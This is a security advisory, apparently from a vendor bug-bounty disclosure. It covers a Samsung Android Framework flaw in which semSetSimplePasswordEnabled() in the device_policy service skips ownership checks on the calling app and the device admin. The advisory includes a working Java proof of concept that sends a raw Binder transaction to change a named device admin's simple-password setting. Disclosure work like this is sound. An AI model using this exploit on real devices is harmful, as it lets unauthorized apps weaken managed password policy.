# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.03</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$200</td>
    </tr>
</table>

# Description

The system service `device_policy` (`android.app.admin.IDevicePolicyManager`) was created in AOSP, but was patched in the Samsung Android Framework. The update contained the `semSetSimplePasswordEnabled()` method. It enabled/disabled the MDM setting of the simple password. The problem was that this method did not validate the ownership of the passed device admin and the app calling the method. Therefore, if the attacker knew the existing device admins (component names), they could change this setting.

**Proof of Concept**

For testing, we enabled `com.sds.emm.cloud.knox.samsung/com.sds.emm.emmagent.core.event.receiver.DeviceAdminPolicyReceiver` as the device admin.

```java
static final int TRANSACTION_semSetSimplePasswordEnabled = 383;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("device_policy");
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeInt(1);
        new ComponentName("com.sds.emm.cloud.knox.samsung", "com.sds.emm.emmagent.core.event.receiver.DeviceAdminPolicyReceiver").writeToParcel(parcel, 0);
        parcel.writeBoolean(true);

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_semSetSimplePasswordEnabled, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
